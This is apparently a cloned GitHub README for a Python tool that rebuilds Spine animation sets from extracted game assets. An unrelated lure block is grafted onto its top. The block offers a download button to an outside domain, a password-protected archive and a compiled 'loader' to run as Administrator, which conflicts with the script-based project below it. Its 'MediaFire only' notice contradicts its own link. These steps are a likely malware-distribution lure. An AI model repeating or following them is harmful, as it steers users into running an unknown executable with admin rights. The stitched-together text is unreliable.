<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Quick start

### Requirements

- Windows 10 or 11
- Python 3.10 or newer, available as `py` or `python` on `PATH`
### Recommended workflow

1. Drag a source folder onto `Run_SpineMagic_Builder_Candidate_Stage_v3.bat`.
2. Wait for the builder to create a neighboring `Spine_Built-*` directory.
3. Open `Run_SpineCandidatePicker_GUI.bat`.
4. Browse to the built directory containing `_candidates` folders.
5. Select a page and candidate, then press **Activate** or a number key.
6. Point the GUI to `SpineViewer.exe` when prompted and visually validate the set.
7. Mark the selection correct, blacklist it, or skip the page.
8. Press **Finalize Set** once one set looks right, or **Finalize All** after all loaded sets are ready.

The GUI remembers its viewer path and decisions in:

```text
%LOCALAPPDATA%\SpineMagicBuilder\spine_candidate_picker_state.json
```

The GUI also writes a rolling timing/debug log to:

```text
%LOCALAPPDATA%\SpineMagicBuilder\spine_candidate_picker_debug.log
```

Set `SPINE_MAGIC_BUILDER_STATE` to use a different state-file location. Set `SPINE_VIEWER_EXE` to define the initial viewer path.

## Included programs

| File | Purpose |
| --- | --- |
| `spine_magic_builder.py` | Core recursive scanner and normalized-set builder. |
| `spine_magic_builder_candidate_materializer_v3.py` | Extended builder with candidate staging and one-candidate materialization. |
| `spine_candidate_picker_gui.py` | Tk GUI for reviewing, activating, finalizing, and recording candidate choices. |
| `Run_SpineMagic_Builder.bat` | Conservative copy-mode builder preset. |
| `Run_SpineMagic_Builder_Candidate_Stage_v3.bat` | Candidate-staging preset optimized for large extracted trees. |
| `Run_SpineCandidatePicker_GUI.bat` | GUI launcher; accepts an optional starting folder. |

## How output is organized

Source files are left in place unless `--move` is explicitly supplied on the command line. The included launchers never use `--move`.

For a selected source folder, output is written next to it in a generated container similar to:

```text
ParentFolder\
├── SourceFolder\
└── Spine_Built-Context_Name\
    └── SourceFolder\
        └── normalized_spine_set\
            ├── normalized_spine_set.skel (or .json)
            ├── normalized_spine_set.atlas
            ├── texture pages
            └── _candidates\
```

Candidate activation preserves the previously active page in `_materialized_history` before placing the new candidate.

## Launcher details

### Standard builder

`Run_SpineMagic_Builder.bat` uses copy mode and a moderate atlas-match threshold. Drag a folder onto it or call:

```bat
Run_SpineMagic_Builder.bat "D:\ExtractedGame\assets"
```

### Candidate-stage builder

`Run_SpineMagic_Builder_Candidate_Stage_v3.bat` isolates immediate child folders as entities, ranks ambiguous same-dimension textures, and stages all candidates. It requests symlinks to avoid dupl[...]

Use `--stage-dim-candidates-limit N` directly from Python when unlimited staging would produce too many candidates.

### Candidate picker GUI

Run without an argument and browse to a folder, or provide a starting path:

```bat
Run_SpineCandidatePicker_GUI.bat "D:\ExtractedGame\Spine_Built-Example"
```

Useful keys:

| Key | Action |
| --- | --- |
| `1`-`9` | Activate candidate rank 1-9 |
| `Enter` | Activate the selected candidate |
| `Left` / `Right` | Previous / next candidate |
| `Ctrl+Left` / `Ctrl+Right` | Previous / next atlas page |
| `C` | Mark selected candidate correct |
| `B` | Blacklist selected candidate |
| `S` | Skip current page |
| `F5` | Launch SpineViewer |

Use the **Viewer exe** button if SpineViewer is not found automatically. The automatic search checks the repository folder, a `SpineViewer` subfolder, and the repository's parent folder. SpineVie[...]

Use **Finalize Set** after visual validation to make the selected texture pages final. Finalize uses **Mark Correct** choices first, then falls back to the last activated candidate for pages that were activated but not explicitly marked. **Finalize All** applies the same rules to every loaded set that has at least one selected or activated page, with a confirmation dialog before anything is changed. The default finalize settings move selected page images into the built set and delete `_candidates`. If a staged candidate is a symlink, move mode dereferences it into a real local file so the finished set does not depend on the staged symlink target. Other finalize modes are copy, hardlink, and symlink; disable **Delete _candidates** to keep staged candidates for audit or later adjustment.

Blacklist and used-image entries are stored per page and globally by candidate identity, cleaned staged filename, and trailing long numeric suffix such as `_00001`. Rejecting or accepting the same source image hides it in later folders as you continue reviewing, and candidate counts show the visible total when **Hide blacklisted** is enabled. **Hide blacklisted** is enabled by default and can be unchecked to review hidden candidates. If an image is already marked correct elsewhere, a later blacklist stays local to the current page.

Use **Preview px** to resize the thumbnail area when a candidate needs closer inspection. The preview size is saved with the other GUI settings.

## Command-line usage

Core builder:

```powershell
py -3 spine_magic_builder.py --root "D:\ExtractedGame\assets" --dims-fallback --prefer-nearby-textures
```

Stage ambiguous dimension matches:

```powershell
py -3 spine_magic_builder_candidate_materializer_v3.py `
  --root "D:\ExtractedGame\assets" `
  --dims-fallback `
  --stage-dim-candidates `
  --stage-dim-candidates-limit 250
```

Activate one staged candidate without the GUI:

```powershell
py -3 spine_magic_builder_candidate_materializer_v3.py `
  --materialize-built-set "D:\Path\To\OneBuiltSet" `
  --materialize-page 1 `
  --materialize-candidate 3 `
  --link-mode copy
```

Run either builder with `--help` for the complete option list. Useful advanced switches include `--explain-match`, `--top-n`, `--entity-mode`, `--rewrite-pages-to-match-source`, and `--dedupe-tex[...]

## Safety notes

- Default CLI behavior copies source textures; the standard launcher explicitly uses copy mode.
- The included launchers never pass `--move`.
- Symlink and hardlink modes save disk space but link generated output to original texture data. Use copy mode if the built set will be edited.
- `--aggressive-atlas` and `--dims-fallback` improve recovery from damaged naming but can produce false matches. Validate ambiguous results visually.
- Candidate staging may consume substantial disk space when linking is unavailable. Set a finite candidate limit if needed.
- Generated state, game assets, candidate folders, and build output are excluded by `.gitignore`.

## Troubleshooting

**Python was not found**  
Install Python 3.10+ and enable the installer option to add Python to `PATH`, then open a new terminal.

**The GUI opens but thumbnails are limited**  
Install `requirements-optional.txt`. The GUI falls back to Tk's built-in PNG loader when Pillow is absent.

**Drag-and-drop does nothing**  
Install `tkinterdnd2`, or use the GUI's Browse button.

**Symlink creation fails on Windows**  
Enable Windows Developer Mode, run with suitable privileges, or use `--link-mode copy`. The candidate builder already falls back to a hardlink and then a copy.

**SpineViewer is missing**  


---

# Contributing

Bug reports and focused pull requests are welcome.

When reporting a matching problem, include:

- the command or launcher used;
- the relevant `[OK]`, `[MISS]`, `[WARN]`, or `[ERR]` output;
- a minimal sanitized folder layout;
- whether the skeleton is JSON or binary and whether the atlas is single-page or multi-page.

Do not attach copyrighted game assets unless you have permission to redistribute them. A small synthetic fixture or redacted metadata sample is preferred.

Before submitting code, run:

```powershell
python -m compileall -q .
python spine_magic_builder.py --help
python spine_magic_builder_candidate_materializer_v3.py --help
python spine_candidate_picker_gui.py --help
```


---

MIT License

Copyright (c) 2026 Spine Magic Builder contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
